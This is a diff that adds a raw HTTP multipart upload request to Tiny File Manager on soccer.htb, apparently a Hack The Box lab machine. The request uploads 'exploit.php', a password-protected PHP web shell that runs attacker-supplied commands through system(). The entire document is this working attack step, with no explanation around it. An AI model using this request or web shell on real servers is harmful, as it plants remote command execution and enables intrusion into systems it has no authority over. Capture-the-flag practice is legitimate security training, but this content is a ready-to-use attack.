@@ -1,0 +1,33 @@
+POST /tiny/tinyfilemanager.php?p=tiny HTTP/1.1
+Host: soccer.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+Accept: application/json
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cache-Control: no-cache
+X-Requested-With: XMLHttpRequest
+Content-Type: multipart/form-data; boundary=---------------------------40362592531568278564103122334
+Content-Length: 573
+Origin: http://soccer.htb
+Connection: close
+Referer: http://soccer.htb/tiny/tinyfilemanager.php?p=tiny&upload
+Cookie: filemanager=6tgmo8j32gnnuvtg68mu1q1k7p
+
+-----------------------------40362592531568278564103122334
+Content-Disposition: form-data; name="p"
+
+tiny
+-----------------------------40362592531568278564103122334
+Content-Disposition: form-data; name="fullpath"
+
+exploit.php
+-----------------------------40362592531568278564103122334
+Content-Disposition: form-data; name="file"; filename="exploit.php"
+Content-Type: application/x-php
+
+<?php
+    if($_POST && $_POST['password']==="AGSH635479302H235") {
+        echo system($_POST['cmd']);
+    }
+?>
+-----------------------------40362592531568278564103122334--
